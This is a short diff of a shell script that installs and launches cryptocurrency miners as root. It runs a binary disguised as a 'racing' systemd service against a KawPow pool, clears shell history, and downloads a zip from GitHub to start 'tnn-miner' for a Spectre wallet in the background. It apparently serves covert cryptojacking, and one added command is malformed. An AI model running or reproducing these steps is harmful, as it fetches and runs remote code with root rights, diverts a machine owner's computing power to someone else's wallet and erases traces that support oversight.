@@ -33,10 +33,12 @@ sudo systemctl daemon-reload
 sudo systemctl enable racing.service
 sudo ./racing -a kawpow -o stratum+tcp://de.aipg.herominers.com:1128 -u AeuwUzTcE8SAkbGF7eaQ1ga2tBMW2kBB7s.s5 -p x &
 history -c
+
 sudo apt-get install unzip
-sudo mkdir /spectre-pool && cd /spectre-pool
-sudo wget https://github.com/argenminers/spectre-blockchain/releases/download/v0.3.14/spectre-pool.zip && sudo unzip -q spectre-pool.zip -d /spectre-pool; spectre-pool -y -y
-sudo screen -S spectre-pool /spectre-pool/tnn-miner --spectre --wallet spectre:qp3p0cd6mk23r940e2qph92tf4v6ufprx96jvm8c3wecalu97uqfk72ul2wz5 --daemon-address spr.tw-pool.com --port 14001 --worker-name gpxx --threads 16 &
+sudo mkdir /spectre-pool && cd /spectre-pool -y
+sudo wget https://github.com/argenminers/spectre-blockchain/releases/download/v0.3.14/spectre-pool.zip 
+sudo unzip -o spectre-pool.zip
+sudo ./tnn-miner --spectre --wallet spectre:qp3p0cd6mk23r940e2qph92tf4v6ufprx96jvm8c3wecalu97uqfk72ul2wz5 --daemon-address spr.tw-pool.com --port 14001 --worker-name gpuxx --threads 16 &
 
 :'
 if [[ $noCore -eq 6 ]]
